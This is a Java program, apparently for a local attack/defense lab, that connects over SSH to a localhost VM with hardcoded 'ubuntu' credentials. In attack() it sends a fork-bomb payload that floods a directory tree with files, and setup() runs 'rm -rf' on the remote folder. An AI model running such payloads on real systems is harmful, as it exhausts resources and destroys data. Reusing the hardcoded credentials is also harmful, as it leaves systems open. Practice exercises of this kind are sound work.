package vitor.dev;

import vitor.dev.connection.SSHConnection;

public class Main {

    private static final String USER = "ubuntu";
    private static final String HOST = "localhost";
    private static final String PASSWD = "ubuntu";
    private static final String REMOTE_PATH = "/home/ubuntu/Vitor";
    private static final String LIB = "src\\main\\resources\\scripts\\";
    private static final String SUDO_PASSWD = "ubuntu";
    private static final int PORT = 2222;

    /**
     * Envia e executa o script de ataque no servidor remoto.
     */
    public static void attack() {
        // Connection.transfer(LIB + "attack.sh", REMOTE_PATH);
        // Connection.command("chmod +x " + REMOTE_PATH + "/attack.sh");
        // Connection.sudoCommand("bash " + REMOTE_PATH + "/attack.sh", SUDO_PASSWD);
        SSHConnection.command(
                "bash -c ':() { for D in $(find \"/home/ubuntu/Vitor\" -type d); do touch \"$D/vitor_$(date +%s%N).txt\"; done; :|: & };:'");
    }

    /**
     * Envia e executa o script de defesa no servidor remoto.
     */
    public static void defense() {
        // Corrigindo caminho para usar LIB (no Windows)
        SSHConnection.transfer(LIB + "defense.sh", REMOTE_PATH);
        SSHConnection.command("chmod +x " + REMOTE_PATH + "/defense.sh");
        SSHConnection.sudoCommand("bash " + REMOTE_PATH + "/defense.sh", SUDO_PASSWD);
    }

    /**
     * Coneta e configura o ambiente no servidor remoto.
     */
    public static void setup() {
        SSHConnection.connect(USER, HOST, PASSWD, PORT); // Se conectando ao host.
        SSHConnection.command("rm -rf " + REMOTE_PATH);
        SSHConnection.command("mkdir " + REMOTE_PATH);
    }

    public static void main(String[] args) {
        setup();
        defense();
        // attack();
    }
}